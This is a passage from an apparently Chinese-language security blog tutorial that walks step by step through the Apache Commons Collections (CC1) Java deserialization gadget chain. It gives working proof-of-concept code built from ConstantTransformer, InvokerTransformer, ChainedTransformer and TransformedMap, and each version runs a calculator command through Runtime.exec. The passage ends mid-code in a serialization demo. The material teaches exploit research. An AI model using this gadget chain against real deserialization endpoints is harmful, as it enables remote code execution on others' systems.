class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的对象不会经过任何改变进行返回，也就是当调用<code>transform</code>方法时会返回构造函数中传入的对象。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj);</span><br><span class="line">        System.out.println(constantTransformer.transform(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220901103831836.png" alt="image-20220901103831836"></p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>类在<code>Collections</code>组件中非常重要，也是我们后面构造 exp 的核心类。<code>InvokerTransformer</code>类的<code>transform</code>方法实现了类方法的动态调用，采用反射机制动态调用类方法（发射方法名、参数值可控）并返回该方法执行结果。该部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">  <span class="comment">// 要调用的方法名称</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">  <span class="comment">// 反射参数类型数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">  <span class="comment">// 反射参数值数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="comment">//异常处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">        );</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220901105358610.png" alt="image-20220901105358610"></p><p>在现实场景下很难通过<code>InvokerTransformer.transform</code>传入<code>Runtime.getRuntime()</code>对象完成命令执行，因此我们需要学习下一个接口实现类<code>ChainedTransformer</code>来构造我们的攻击链。</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><code>ChainedTransformer</code>类封装了<code>Transformer</code>的链式调用，当传入一个<code>Transformer</code>数组时，<code>ChainedTransformer</code>就会依次调用每一个<code>Transformer</code>的<code>transform</code>方法，关键源码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>贴一张 P 牛画的图<br><img src="images/img.png" alt="img"></p><p>通过<code>ChainedTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transformer</span> <span class="operator">=</span> chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220903222648532.png" alt="image-20220903222648532"></p><p>先对上述的<code>poc</code>做一个分析：</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class)</span><br></pre></td></tr></table></figure><p>传入的<code>java.lang.Runtime</code>类原封不动的返回并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中<br><img src="images/image-20220904212600633.png" alt="image-20220904212600633"></p><p><strong>InvokerTransformer 1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类的<code>transform()</code>方法里的反射，获取到<code>java.lang.Runtime</code>类的<code>getMethod()</code>方法并执行<code>getRuntime()</code>方法<br><img src="images/image-20220904213709408.png" alt="image-20220904213709408"></p><p>最后返回<code>java.lang.Runtime.getRuntime()</code>方法并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p><strong>InvokerTransformer 2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="images/image-20220904230545177.png" alt="image-20220904230545177"></p><p>传入的<code>Method</code>对象通过<code>getClass()</code>获取到反射类<code>java.lang.reflect.Method</code>，接着通过反射获取到<code>invoke()</code>方法执行传入的<code>java.lang.Runtime.getRuntime()</code>方法，返回<code>Runtime</code>对象并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p>这里比较有趣的是在最后执行<code>method.invoke(input,null)</code>时代入参数是<code>invoke.invoke(input,null)</code>的形式，依然能执行命令。</p><p><strong>InvokerTransformer 3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="images/image-20220904232209075.png" alt="image-20220904232209075"></p><p>传入的<code>Runtime</code>实例通过<code>getClass()</code>获取到<code>Runtime</code>类，接着通过反射获取到<code>exec()</code>方法，最后通过<code>invoke()</code>执行传进来的<code>iArgs</code>命令</p><p>至此通过<code>ChainedTransformer</code>类，把<code>ConstantTransformer</code>类和多个<code>InvokerTransformer</code>类实现的<code>transform</code>方法一一执行，完成命令执行的利用链。</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>上述虽然构造了一串巧妙的命令执行利用链，但是仍然遗留下未解决的问题：需要转换对象成<code>ChainedTransformer</code>类型接着执行<code>transform()</code>方法<br><img src="images/image-20220905223858552.png" alt="image-20220905223858552"></p><p>所以我们需要解决以下问题：</p><ol><li>传入恶意的<code>ChainedTransformer</code>类</li><li>调用<code>ChainedTransformer</code>类创建的对象<code>chainedTransformer</code>的<code>transformer()</code>方法执行命令</li></ol><p>这里引入<code>TransformedMap</code>类，<code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了<code>java.util.Map</code>接口，同时支持对<code>Map</code>的<code>key</code>或者<code>value</code>进行<code>Transformer</code>转换，通过调用<code>decorate()</code>和<code>decorateTransform()</code>方法都可以进入<code>TransformedMap()</code>构造函数<br><img src="images/image-20220913165342046.png" alt="image-20220913165342046"></p><p>可以看到在<code>TransformedMap</code>类中通过<code>checkSetValue()</code>、<code>put()</code>和<code>putAll()</code>方法都可以调用传进来的<code>Transform</code>类（例如<code>InvokerTransformer</code>）的<code>transform()</code>方法<br><img src="images/image-20220913173832979.png" alt="image-20220913173832979"></p><p><img src="images/image-20220913180215864.png" alt="image-20220913180215864"></p><p>POC 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历Map元素，并调用setValue方法</span></span><br><span class="line">        <span class="keyword">for</span>(Object obj: transformedMap.entrySet())&#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">            entry.setValue(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后通过<code>setValue()</code>方法调用了<code>checkSetValue()</code>方法，从而造成命令执行<br><img src="images/image-20220913180841818.png" alt="image-20220913180841818"></p><p><img src="images/image-20220913180501737.png" alt="image-20220913180501737"></p><p>模拟成现实情况（客户端发送请求-服务端处理请求）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span 